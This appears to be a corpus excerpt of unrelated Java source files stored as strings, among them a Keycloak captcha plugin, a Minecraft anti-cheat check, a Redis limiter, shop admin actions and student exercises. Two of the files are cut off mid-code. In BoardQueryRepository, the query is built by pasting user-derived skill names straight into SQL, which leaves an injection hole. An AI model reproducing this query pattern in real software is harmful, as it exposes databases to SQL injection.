    "/*\n * Copyright 2016 Red Hat, Inc. and/or its affiliates\n * and other contributors as indicated by the @author tags.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage com.captchafox.keycloak.authenticator;\n\nimport org.apache.http.NameValuePair;\nimport org.apache.http.client.entity.UrlEncodedFormEntity;\nimport org.apache.http.client.methods.CloseableHttpResponse;\nimport org.apache.http.client.methods.HttpPost;\nimport org.apache.http.impl.client.CloseableHttpClient;\nimport org.apache.http.message.BasicNameValuePair;\nimport org.apache.http.util.EntityUtils;\nimport org.jboss.logging.Logger;\nimport org.keycloak.Config.Scope;\nimport org.keycloak.authentication.FormAction;\nimport org.keycloak.authentication.FormActionFactory;\nimport org.keycloak.authentication.FormContext;\nimport org.keycloak.authentication.ValidationContext;\nimport org.keycloak.connections.httpclient.HttpClientProvider;\nimport org.keycloak.events.Details;\nimport org.keycloak.events.Errors;\nimport org.keycloak.forms.login.LoginFormsProvider;\nimport org.keycloak.models.*;\nimport org.keycloak.models.utils.FormMessage;\nimport org.keycloak.provider.ProviderConfigProperty;\nimport org.keycloak.services.ServicesLogger;\nimport org.keycloak.services.messages.Messages;\nimport org.keycloak.services.validation.Validation;\nimport org.keycloak.util.JsonSerialization;\n\nimport jakarta.ws.rs.core.MultivaluedMap;\n\nimport java.io.InputStream;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.Map;\n\npublic class RegistrationCaptchaFox implements FormAction, FormActionFactory {\n    private static final Logger LOGGER = Logger.getLogger(RegistrationCaptchaFox.class);\n    public static final String CAPTCHA_RESPONSE_KEY = \"cf-captcha-response\";\n    public static final String REFERENCE_CATEGORY = \"captchafox\";\n    public static final String SITE_KEY = \"site.key\";\n    public static final String SITE_SECRET = \"secret\";\n\n    public static final String PROVIDER_ID = \"registration-captchafox-action\";\n\n    @Override\n    public void close() {\n\n    }\n\n    @Override\n    public FormAction create(KeycloakSession session) {\n        return this;\n    }\n\n    @Override\n    public void init(Scope config) {\n\n    }\n\n    @Override\n    public void postInit(KeycloakSessionFactory factory) {\n\n    }\n\n    @Override\n    public String getId() {\n        return PROVIDER_ID;\n    }\n\n    @Override\n    public String getDisplayType() {\n        return \"CaptchaFox\";\n    }\n\n    @Override\n    public String getReferenceCategory() {\n        return REFERENCE_CATEGORY;\n    }\n\n    @Override\n    public boolean isConfigurable() {\n        return true;\n    }\n\n    @Override\n    public AuthenticationExecutionModel.Requirement[] getRequirementChoices() {\n        return new AuthenticationExecutionModel.Requirement[] {\n                AuthenticationExecutionModel.Requirement.REQUIRED,\n                AuthenticationExecutionModel.Requirement.DISABLED\n        };\n    }\n\n    @Override\n    public boolean isUserSetupAllowed() {\n        return false;\n    }\n\n    @Override\n    public String getHelpText() {\n        return \"Adds CaptchaFox button. CaptchaFox verifies that the entity that is registering is a human.  This can only be used on the internet and must be configured after you add it.\";\n    }\n\n    @Override\n    public void buildPage(FormContext context, LoginFormsProvider form) {\n        AuthenticatorConfigModel captchaConfig = context.getAuthenticatorConfig();\n        String userLanguageTag = context.getSession().getContext().resolveLocale(context.getUser()).toLanguageTag();\n\n        if (captchaConfig == null || captchaConfig.getConfig() == null\n                || captchaConfig.getConfig().get(SITE_KEY) == null\n                || captchaConfig.getConfig().get(SITE_SECRET) == null) {\n            form.addError(new FormMessage(null, Messages.RECAPTCHA_NOT_CONFIGURED));\n            return;\n        }\n\n        String siteKey = captchaConfig.getConfig().get(SITE_KEY);\n        String mode = captchaConfig.getConfig().get(\"mode\");\n        form.setAttribute(\"captchaFoxRequired\", true);\n        form.setAttribute(\"captchaFoxMode\", mode);\n        form.setAttribute(\"captchaFoxSiteKey\", siteKey);\n        form.addScript(\"https://cdn.captchafox.com/api.js?lang=\" + userLanguageTag);\n\n    }\n\n    @Override\n    public void validate(ValidationContext context) {\n        MultivaluedMap<String, String> formData = context.getHttpRequest().getDecodedFormParameters();\n        Li",
    "/*\n * Copyright (C) 2024-2026 Jidcoo(https://github.com/jidcoo).\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage io.github.jidcoo.opto.lcdb.enhancer.core.io.builtin;\n\nimport io.github.jidcoo.opto.lcdb.enhancer.base.OutputConsumer;\n\nimport java.io.*;\n\n/**\n * <p>FileOutputConsumer is a {@link OutputConsumer} and\n * extends on {@link BaseBufferWriterOutputConsumer}.</p>\n *\n * <p>FileOutputConsumer use the {@link OutputStream}\n * or the {@link File} as output source.\n * </p>\n *\n * @author Jidcoo\n * @see OutputConsumer\n * @see BaseBufferWriterOutputConsumer\n * @see OutputStream\n * @see File\n * @since 1.0\n */\npublic class FileOutputConsumer extends BaseBufferWriterOutputConsumer {\n\n    /**\n     * Create a FileOutputConsumer by abstract output stream.\n     *\n     * @param outputStream the output stream.\n     */\n    public FileOutputConsumer(OutputStream outputStream) {\n        super(outputStream);\n    }\n\n    /**\n     * Create a FileOutputConsumer by file.\n     *\n     * @param file the file.\n     */\n    public FileOutputConsumer(File file) throws FileNotFoundException {\n        this(new FileOutputStream(file));\n    }\n\n    /**\n     * Create a FileOutputConsumer by file path.\n     *\n     * @param filePath the file path.\n     */\n    public FileOutputConsumer(String filePath) throws FileNotFoundException {\n        this(new File(filePath));\n    }\n}\n",
    "package main.java.struction.composite;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\n/**\n * Create with IntelliJ IDEA\n * Author:YangZhao\n * Date:2024/4/6\n * Time:14:23\n */\npublic class Album extends Image {\n\n    private List<Image> images = new ArrayList<>();\n    private String name;\n\n    public Album(String name) {\n        this.name = name;\n    }\n\n    @Override\n    public void add(Image image) {\n        images.add(image);\n    }\n\n    @Override\n    public void remove(int index) {\n        this.images.remove(index);\n    }\n\n    @Override\n    public int getCount() {\n        return this.images.size();\n    }\n\n    @Override\n    public void printName(int deepth) {\n        // fixme\n        StringBuilder preTrim = new StringBuilder();\n        preTrim.append(\"\u2502\");\n        for (int i = 1; i < deepth - 1; i++) {\n            preTrim.append(\" \");\n        }\n        preTrim.append(\"\u2514\u2500\");\n        System.out.println(preTrim + this.name);\n        for (Image image : this.images) {\n            image.printName(deepth + 1);\n        }\n    }\n}\n",
    "package org.smokeeaasd.mpowers.listeners;\n\nimport org.bukkit.Location;\nimport org.bukkit.Sound;\nimport org.bukkit.World;\nimport org.bukkit.entity.EntityType;\nimport org.bukkit.entity.LivingEntity;\nimport org.bukkit.entity.Player;\nimport org.bukkit.event.EventHandler;\nimport org.bukkit.event.Listener;\nimport org.bukkit.event.entity.EntityDeathEvent;\n\nimport java.util.Arrays;\nimport java.util.List;\n\npublic class MobEventListener implements Listener {\n    private final List<EntityType> allowedMobs = Arrays.asList(\n            EntityType.CHICKEN,\n            EntityType.SPIDER,\n            EntityType.RABBIT,\n            EntityType.AXOLOTL\n    );\n    @EventHandler\n    public void onEntityDeath(EntityDeathEvent event) {\n        LivingEntity livingEntity = event.getEntity();\n        Player killer = livingEntity.getKiller();\n\n        if (killer != null)\n        {\n            Location playerLoc = killer.getLocation();\n            World playerWorld = playerLoc.getWorld();\n\n            EntityType livingEntityType = livingEntity.getType();\n\n            if (allowedMobs.contains(livingEntityType))\n            {\n                playerWorld.playSound(playerLoc, Sound.ENTITY_EXPERIENCE_ORB_PICKUP, 1, 1);\n            }\n        }\n    }\n}\n",
    "/*\n * Copyright (C) 2024 Marcus Hirt\n *                    www.hirt.se\n *\n * This software is free:\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n *\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in the\n *    documentation and/or other materials provided with the distribution.\n * 3. The name of the author may not be used to endorse or promote products\n *    derived from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESSED OR\n * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES\n * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.\n * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT\n * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\n * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n * Copyright (C) Marcus Hirt, 2024\n */\npackage se.hirt.recgen;\n\nimport java.io.File;\nimport java.io.IOException;\n\n/**\n * Might do lookups of these reflectively if we start adding lots of these...\n */\npublic interface RecordingGenerator {\n\tvoid generateRecording(File destinationFolder, String recordingName) throws IOException;\n}\n",
    "package com.work.common.utils;\n\nimport java.util.List;\n\npublic class Page<T> {\n\tprivate int total;//\u603b\u6761\u6570\n\tprivate int page;//\u5f53\u524d\u9875\n\tprivate int size;//\u5f53\u524d\u9875\u6761\u6570\n    private List<T> rows;\n    private List<T> rows_1;\n    private List<T> rows_2;\n    private List<T> rows_3;\n    private List<T> rows_4;\n    private List<T> rows_5;\n    private List<T> rows_6;\n    private List<T> rows_7;\n    private List<T> rows_8;\n\tpublic int getTotal() {\n\t\treturn total;\n\t}\n\tpublic void setTotal(int total) {\n\t\tthis.total = total;\n\t}\n\tpublic int getPage() {\n\t\treturn page;\n\t}\n\tpublic void setPage(int page) {\n\t\tthis.page = page;\n\t}\n\tpublic int getSize() {\n\t\treturn size;\n\t}\n\tpublic void setSize(int size) {\n\t\tthis.size = size;\n\t}\n\tpublic List<T> getRows() {\n\t\treturn rows;\n\t}\n\tpublic void setRows(List<T> rows) {\n\t\tthis.rows = rows;\n\t}\n\tpublic List<T> getRows_1() {\n\t\treturn rows_1;\n\t}\n\tpublic void setRows_1(List<T> rows_1) {\n\t\tthis.rows_1 = rows_1;\n\t}\n\tpublic List<T> getRows_2() {\n\t\treturn rows_2;\n\t}\n\tpublic void setRows_2(List<T> rows_2) {\n\t\tthis.rows_2 = rows_2;\n\t}\n\tpublic List<T> getRows_3() {\n\t\treturn rows_3;\n\t}\n\tpublic void setRows_3(List<T> rows_3) {\n\t\tthis.rows_3 = rows_3;\n\t}\n\tpublic List<T> getRows_4() {\n\t\treturn rows_4;\n\t}\n\tpublic void setRows_4(List<T> rows_4) {\n\t\tthis.rows_4 = rows_4;\n\t}\n\tpublic List<T> getRows_5() {\n\t\treturn rows_5;\n\t}\n\tpublic void setRows_5(List<T> rows_5) {\n\t\tthis.rows_5 = rows_5;\n\t}\n\tpublic List<T> getRows_6() {\n\t\treturn rows_6;\n\t}\n\tpublic void setRows_6(List<T> rows_6) {\n\t\tthis.rows_6 = rows_6;\n\t}\n\tpublic List<T> getRows_7() {\n\t\treturn rows_7;\n\t}\n\tpublic void setRows_7(List<T> rows_7) {\n\t\tthis.rows_7 = rows_7;\n\t}\n\tpublic List<T> getRows_8() {\n\t\treturn rows_8;\n\t}\n\tpublic void setRows_8(List<T> rows_8) {\n\t\tthis.rows_8 = rows_8;\n\t}  \t\n\t\n}\n",
    "package shop.mtcoding.projectjobplan.board;\n\n\nimport jakarta.persistence.EntityManager;\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.stereotype.Repository;\nimport shop.mtcoding.projectjobplan.skill.Skill;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.StringJoiner;\n\n@RequiredArgsConstructor\n@Repository\npublic class BoardQueryRepository {\n    private final EntityManager entityManager;\n\n    private static String buildWhereClause(List<String> keywords) {\n        StringJoiner whereClause = new StringJoiner(\" OR \");\n        for (String keyword : keywords) {\n            whereClause.add(\"s.name = '\" + keyword + \"'\");\n        }\n        return whereClause.toString();\n    }\n\n    public List<Object[]> findWithSkill(List<Skill> skills) {\n        List<String> skillNameList = new ArrayList<>();\n        skills.forEach(skill -> skillNameList.add(skill.getName()));\n        System.out.println(\"skill input test : \" + skillNameList);\n        String queryStart = \"\"\"\n                SELECT b.id, b.title, b.field, u.business_name FROM\n                (SELECT s.board_id, COUNT(s.name) AS name_count\n                FROM skill_tb AS s\n                WHERE s.board_id IS NOT NULL\n                AND (\"\"\";\n        String whereClause = buildWhereClause(skillNameList);\n        String queryEnd = \"\"\"\n                )\n                GROUP BY s.board_id\n                ORDER BY name_count DESC) s,\n                board_tb b, user_tb u\n                WHERE b.id = s.board_id\n                AND\n                b.user_id = u.id\n                \"\"\";\n        String limit = \" LIMIT 3\";\n        String query = queryStart + whereClause + queryEnd + limit;\n\n        return entityManager.createNativeQuery(query).getResultList();\n    }\n}\n",
    "package top.infsky.cheatdetector.anticheat.checks;\n\nimport lombok.val;\nimport net.minecraft.world.item.ElytraItem;\nimport net.minecraft.world.phys.Vec3;\nimport top.infsky.cheatdetector.anticheat.Check;\nimport top.infsky.cheatdetector.anticheat.TRPlayer;\n\nimport static top.infsky.cheatdetector.CheatDetector.CONFIG;\n\npublic class HighJumpA extends Check {\n    public double highestY = Double.MIN_VALUE;\n    public HighJumpA(TRPlayer player) {\n        super(\"HighJumpA\", player);\n    }\n\n    @Override\n    public void _onTick() {\n        if (ElytraItem.isFlyEnabled(player.fabricPlayer.getInventory().getArmor(2))) return;\n\n        if (player.isJumping() && player.lastOnGroundPos != player.lastOnLiquidGroundPos && !(player.fabricPlayer.hurtTime > 0) && !player.fabricPlayer.isPassenger()) {\n            if (player.currentPos.y() > highestY) highestY = player.currentPos.y();\n\n            val groundPrefixPos = new Vec3(0, player.lastOnGroundPos.y(), 0);\n            val airPrefixPos = new Vec3(0, highestY, 0);\n\n            final double jumpDistance = airPrefixPos.distanceTo(groundPrefixPos);\n            final double possibleDistance = 1 + player.fabricPlayer.getJumpBoostPower() + CONFIG().getThreshold();\n            if (jumpDistance > 1.25219 * possibleDistance) {\n                flag(String.format(\"Current: %.2f Max: %.2f\", jumpDistance, possibleDistance));\n            }\n        } else highestY = Double.MIN_VALUE;\n    }\n}\n",
    "package online.zust.qcqcqc.utils.manager.concurrent;\n\nimport jakarta.annotation.Resource;\nimport online.zust.qcqcqc.utils.config.LimiterConfig;\nimport online.zust.qcqcqc.utils.entity.Limiter;\nimport online.zust.qcqcqc.utils.exception.CannotLoadLuaScriptException;\nimport online.zust.qcqcqc.utils.limiters.ConcurrentLimiterManager;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnProperty;\nimport org.springframework.context.annotation.Primary;\nimport org.springframework.core.io.ClassPathResource;\nimport org.springframework.data.redis.connection.ReturnType;\nimport org.springframework.data.redis.core.RedisCallback;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.stereotype.Component;\n\n\n/**\n * @author pqcmm\n */\n@Component\n@Primary\n@ConditionalOnProperty(value = \"limiter.type\", havingValue = \"redis\")\npublic class BaseRedisConcurrentLimitManager implements ConcurrentLimiterManager {\n\n    private static final Logger log = LoggerFactory.getLogger(BaseRedisConcurrentLimitManager.class);\n\n    private RedisTemplate<String, Long> redisTemplate;\n\n    private LimiterConfig limiterConfig;\n\n    private static byte[] CHECK_CONCURRENT_SCRIPT_BYTE;\n\n    @Autowired\n    public void setLimiterConfig(LimiterConfig limiterConfig) {\n        this.limiterConfig = limiterConfig;\n    }\n\n    @Resource\n    public void setRedisTemplate(RedisTemplate<String, Long> redisTemplate) {\n        this.redisTemplate = redisTemplate;\n        // \u8bfb\u53d6lua\u811a\u672c\n        ClassPathResource checkConcurrentResource = new ClassPathResource(\"scripts/checkConcurrent.lua\");\n        try {\n            CHECK_CONCURRENT_SCRIPT_BYTE = checkConcurrentResource.getInputStream().readAllBytes();\n        } catch (Exception e) {\n            log.error(\"\u8bfb\u53d6lua\u811a\u672c\u5931\u8d25\uff1a{}\", e.getMessage());\n            throw new CannotLoadLuaScriptException(\"\u8bfb\u53d6lua\u811a\u672c\u5931\u8d25\uff1a\" + e.getMessage());\n        }\n    }\n\n    @Override\n    public boolean tryAccess(Limiter limiter) {\n        boolean limitByUser = limiter.isLimitByUser();\n        int limitNum = limiter.getLimitNum();\n        String key = limiter.getKey();\n        boolean set = limiter.isBefore();\n\n        if (limitByUser) {\n            key = limiterConfig.getUserKey() + \"-\" + key + \"-concurrent\";\n        }\n        return tryAlterStatus(key, limitNum, set);\n    }\n\n    private boolean tryAlterStatus(String key, int limitNum, boolean set) {\n        long currentTime = System.nanoTime();\n        Long result = redisTemplate.execute((RedisCallback<Long>) connection -> connection.eval(\n                CHECK_CONCURRENT_SCRIPT_BYTE,\n                ReturnType.INTEGER,\n                1,\n                redisTemplate.getStringSerializer().serialize(key),\n                redisTemplate.getStringSerializer().serialize(String.valueOf(limitNum)),\n                redisTemplate.getStringSerializer().serialize(String.valueOf(set)),\n                redisTemplate.getStringSerializer().serialize(String.valueOf(currentTime))\n        ));\n        return result != null && result.equals(1L);\n    }\n}\n",
    "package US_507;\n\nimport Utility.BaseDriver;\nimport Utility.Tools;\nimport org.openqa.selenium.support.ui.*;\nimport org.testng.Assert;\nimport org.testng.annotations.Test;\n\npublic class ComputerOrder extends BaseDriver {\n\n\n    @Test(groups = {\"UI Test\", \"TABMenu Test\", \"Order Test\"})\n    public void TC_507() {\n\n        ComputerOrder_Elements coe = new ComputerOrder_Elements();\n\n        Assert.assertTrue(coe.tabMenu.get(0).getText().contains(\"Computers\"), \"Tab menu did not display\");\n        Assert.assertTrue(coe.tabMenu.get(1).getText().trim().equals(\"Electronics\"), \"Tab menu did not display\");\n        Assert.assertEquals(coe.tabMenu.get(2).getText().trim(), \"Apparel\", \"Tab menu did not display\");\n        Tools.ActionHover(coe.computers);\n        Assert.assertTrue(coe.computersSubList.get(0).getText().trim().equals(\"Desktops\"), \"Desktops did not display\");\n        coe.computersSubList.get(0).click();\n        wait.until(ExpectedConditions.urlContains(\"desktops\"));\n        Assert.assertTrue(coe.productList.get(0).getText().contains(\"Build\"), \"Desktop did not display\");\n        coe.productList.get(0).click();\n        wait.until(ExpectedConditions.urlContains(\"build-your-own-computer\"));\n\n        int random = Tools.randomGenerator(coe.ramChoice.size());\n        coe.ramChoice.get(random).click();\n\n        int random1 = Tools.randomGenerator(coe.harddiscChoice.size());\n        Tools.JavaScriptClick(coe.harddiscChoice.get(random1));\n\n        wait.until(ExpectedConditions.elementToBeClickable(coe.addCart));\n        Tools.JavaScriptClick(coe.addCart);\n\n        coe.greenAddCart.click();\n\n        wait.until(ExpectedConditions.visibilityOf(coe.priceValue2));\n       // Assert.assertEquals(coe.priceValue1.getText(), coe.priceValue2.getText(), \"The price is not same.\");\n        //String price1=\"\";\n\n\n    }\n}",
    "package cn.itbaizhan.shop.order.adminaction;\n\nimport java.util.List;\n\nimport cn.itbaizhan.shop.order.service.OrderService;\nimport cn.itbaizhan.shop.order.vo.Order;\nimport cn.itbaizhan.shop.order.vo.OrderItem;\nimport cn.itbaizhan.shop.utils.PageBean;\n\nimport com.opensymphony.xwork2.ActionContext;\nimport com.opensymphony.xwork2.ActionSupport;\nimport com.opensymphony.xwork2.ModelDriven;\n\n/**\n * \u540e\u53f0\u8ba2\u5355\u7ba1\u7406\u7684Action\n */\npublic class AdminOrderAction extends ActionSupport implements ModelDriven<Order>{\n\t// \u6a21\u578b\u9a71\u52a8\u4f7f\u7528\u7684\u7c7b\n\tprivate Order order = new Order();\n\n\tpublic Order getModel() {\n\t\treturn order;\n\t}\n\t// \u63a5\u6536page\u53c2\u6570\n\tprivate Integer page;\n\t\n\tpublic void setPage(Integer page) {\n\t\tthis.page = page;\n\t}\n\t\n\t// \u6ce8\u5165OrderService\n\tprivate OrderService orderService;\n\n\tpublic void setOrderService(OrderService orderService) {\n\t\tthis.orderService = orderService;\n\t}\n\n\n\t// \u63d0\u4f9b\u540e\u53f0\u67e5\u8be2\u6240\u6709\u8ba2\u5355\u7684\u65b9\u6cd5:\n\tpublic String findAll(){\n\t\t// \u8ba2\u5355\u7684\u5206\u9875\u67e5\u8be2\n\t\tPageBean<Order> pageBean = orderService.findAll(page);\n\t\t// \u5c06\u6570\u636e\u5b58\u5165\u5230\u503c\u6808\u4e2d\u4fdd\u5b58\u5230\u9875\u9762\n\t\tActionContext.getContext().getValueStack().set(\"pageBean\", pageBean);\n\t\t// \u9875\u9762\u8df3\u8f6c:\n\t\treturn \"findAll\";\n\t}\n\n\t// \u4fee\u6539\u8ba2\u5355\u72b6\u6001\n\tpublic String updateState(){\n\t\t// \u6839\u636eid\u67e5\u8be2\u8ba2\u5355\n\t\tOrder currOrder = orderService.findByOid(order.getOid());\n\t\tcurrOrder.setState(3);\n\t\torderService.update(currOrder);\n\t\t// \u9875\u9762\u8df3\u8f6c\n\t\treturn \"updateStateSuccess\";\n\t}\n\t\n\t// \u6839\u636e\u8ba2\u5355\u7684id\u67e5\u8be2\u8ba2\u5355\u9879:\n\tpublic String findOrderItem(){\n\t\t// \u6839\u636e\u8ba2\u5355id\u67e5\u8be2\u8ba2\u5355\u9879:\n\t\tList<OrderItem> list = orderService.findOrderItem(order.getOid());\n\t\t// \u663e\u793a\u5230\u9875\u9762:\n\t\tActionContext.getContext().getValueStack().set(\"list\", list);\n\t\t// \u9875\u9762\u8df3\u8f6c\n\t\treturn \"findOrderItem\";\n\t}\n}\n",
    "\r\nimport java.util.Scanner;\r\n\r\npublic class Q3 {\r\n    private static void appendText(StringBuffer text) {\r\n        Scanner obj = new Scanner(System.in);\r\n        System.out.println(\"Enter text to append:\");\r\n        String newText = obj.nextLine();\r\n        text.append(newText);\r\n        printCurrentState(text);\r\n    }\r\n\r\n    private static void insertText(StringBuffer text) {\r\n        Scanner obj = new Scanner(System.in);\r\n        System.out.println(\"Enter text to insert:\");\r\n        String newText = obj.nextLine();\r\n        System.out.println(\"Enter index to insert at:\");\r\n        int index = obj.nextInt();\r\n        text.insert(index, newText);\r\n        printCurrentState(text);\r\n    }\r\n\r\n    private static void deleteText(StringBuffer text) {\r\n        Scanner obj = new Scanner(System.in);\r\n        System.out.println(\"Enter starting index of text to delete:\");\r\n        int startIndex = obj.nextInt();\r\n        System.out.println(\"Enter ending index of text to delete:\");\r\n        int endIndex = obj.nextInt();\r\n        text.delete(startIndex, endIndex);\r\n        printCurrentState(text);\r\n    }\r\n\r\n    private static void reverseText(StringBuffer text)\r\n    {\r\n        text.reverse();\r\n        printCurrentState(text);\r\n    }\r\n\r\n    private static void replaceText(StringBuffer text) {\r\n        Scanner obj = new Scanner(System.in);\r\n        System.out.println(\"Enter starting index of text to replace:\");\r\n        int startIndex = obj.nextInt();\r\n        System.out.println(\"Enter ending index of text to replace:\");\r\n        int endIndex = obj.nextInt();\r\n        obj.nextLine(); // Consume newline character\r\n        System.out.println(\"Enter replacement text:\");\r\n        String replacementText = obj.nextLine();\r\n        text.replace(startIndex, endIndex, replacementText);\r\n        printCurrentState(text);\r\n    }\r\n\r\n    private static void printCurrentState(StringBuffer text)\r\n    {\r\n        System.out.println(\"Current Text: \" + text);\r\n        System.out.println(\"Length: \" + text.length());\r\n        System.out.println(\"Capacity: \" + text.capacity());\r\n    }\r\n\r\n    public static void main(String[] args) {\r\n        StringBuffer text = new StringBuffer();\r\n\r\n        Scanner obj = new Scanner(System.in);\r\n\r\n        while (true) {\r\n            System.out.println(\"\\nMenu:\");\r\n            System.out.println(\"1. Append text\");\r\n            System.out.println(\"2. Insert text\");\r\n            System.out.println(\"3. Delete text\");\r\n            System.out.println(\"4. Reverse text\");\r\n            System.out.println(\"5. Replace text\");\r\n            System.out.println(\"6. Exit\");\r\n            System.out.println(\"Enter your choice:\");\r\n\r\n            int choice = obj.nextInt();\r\n\r\n            switch (choice) {\r\n                case 1:\r\n                    appendText(text);\r\n                    break;\r\n                case 2:\r\n                    insertText(text);\r\n                    break;\r\n                case 3:\r\n                    deleteText(text);\r\n                    break;\r\n                case 4:\r\n                    reverseText(text);\r\n                    break;\r\n                case 5:\r\n                    replaceText(text);\r\n                    break;\r\n                case 6:\r\n                    System.out.println(\"Exiting...\");\r\n                    obj.close();\r\n                    return;\r\n                default:\r\n                    System.out.println(\"Invalid choice. Please enter a number from 1 to 6.\");\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\n",
    "import java.util.Scanner;\r\nimport java.io.IOException;\r\nimport java.util.Random;\r\npublic class Lotofacil {\r\n\r\n    public static void main(String[] args) {\r\n       Scanner scanner = new Scanner(System.in);\r\n         int opcoesMenu;\r\n\r\n\r\n         System.out.println(\"*****************\");\r\n            System.out.println(\"Menu LOTOFACIL:\");\r\n            System.out.println(\"1) Apostar de 0 a 100\");\r\n            System.out.println(\"2) Apostar de A a Z\");\r\n            System.out.println(\"3) Apostar em par ou impar\");\r\n            System.out.println(\"0) Sair\");\r\n            System.out.println(\"*****************\");\r\n            System.out.print(\"Escolha uma opcao: \");\r\n            \r\n       do {\r\n                opcoesMenu = scanner.nextInt();\r\n\r\n                    switch (opcoesMenu) {\r\n                \r\n                case 1:\r\n                    System.out.println(\"*******************\");\r\n                    System.out.println(\"Jogo escolhido:\");\r\n                    System.out.println(\"Apostar de 0 a 100\");\r\n                    System.out.println(\"*******************\");\r\n                    Scanner meuNumero = new Scanner(System.in);\r\n                        System.out.println(\"Digite o seu numero de aposta: \");\r\n                        int numeroInformado = meuNumero.nextInt();\r\n                        if (numeroInformado < 0 || numeroInformado > 100) {\r\n                            System.out.println(\"Aposta invalida. O numero deve estar entre 0 e 100!\");\r\n                            System.out.println(\"Digite 0 para sair ou 1 para jogar novamente.\");\r\n                            }else {\r\n                                Random gerador = new Random();\r\n                                int numeroSorteado = gerador.nextInt(100);\r\n                                System.out.println(\"O seu numero digitado foi: \" + numeroInformado);\r\n                                System.out.println(\"O numero sorteado e: \" + numeroSorteado);\r\n                                    if (numeroInformado == numeroSorteado) {\r\n                                        System.out.println(\"Parabens! Voce acertou e ganhou R$1.000,00\");\r\n                                    }else {\r\n                                        System.out.println(\"Que pena! Voce errou!\");\r\n                                    }\r\n                                System.out.println(\"Digite 0 para sair.\");\r\n                            }\r\n                    break;\r\n                \r\n                case 2:\r\n                    System.out.println(\"*******************\");\r\n                    System.out.println(\"Jogo escolhido:\");\r\n                    System.out.println(\"Apostar de A a Z\");\r\n                    System.out.println(\"*******************\");\r\n                    System.out.println(\"Digite uma letra de A a Z: \");   \r\n                    char letraPremiada = 'G';\r\n                    try {\r\n                        int codigoAscii = System.in.read();\r\n                        char letraAposta = Character.toUpperCase((char) codigoAscii);\r\n                        System.out.println(\"A letra apostada foi:\" + \" \" + letraAposta);\r\n                        if (Character.isLetter(letraAposta)) {\r\n                            if (letraAposta == letraPremiada) {\r\n                                System.out.println(\"Voce ganhou R$ 500,00 reais.\");\r\n                            }else {\r\n                                System.out.println(\"Que pena! A letra sorteada foi: \" + letraPremiada);\r\n                            }\r\n                        }else {\r\n                            System.out.println(\"Aposta inv\u00e1lida. Digite uma letra de A a Z.\");\r\n                        }\r\n                    } catch (IOException e) {\r\n                        System.out.println(\"Erro ao ler a entrada.\");\r\n                        e.printStackTrace();\r\n                    }\r\n                    \r\n                break;\r\n                \r\n                case 3:\r\n                    System.out.println(\"*******************\");\r\n                    System.out.println(\"Jogo escolhido:\");\r\n                    System.out.println(\"Apostar em par ou impar\");\r\n                    System.out.println(\"*******************\");\r\n                    Scanner parOuImpar = new Scanner(System.in);\r\n                    System.out.println(\"Digite um numero: \");\r\n                    int nParOuImpar = parOuImpar.nextInt();\r\n                    if (nParOuImpar % 2 == 0) {\r\n                        System.out.println(\"O numero \" + nParOuImpar + \" e par.\");\r\n                        System.out.println(\"Parabens. Voce ganhou R$100,00\");\r\n                        }else {\r\n                            System.out.println(\"O numero \" + nParOuImpar + \" e impar.\");\r\n                            System.out.println(\"Que pena, voce perdeu. A premiacao era apenas para numeros pares.\");\r\n                            System.out.println(\"Digite 0 para sair.\");\r\n                        }\r\n\r\n\r\n                    break;\r\n                case 0:\r\n        ",
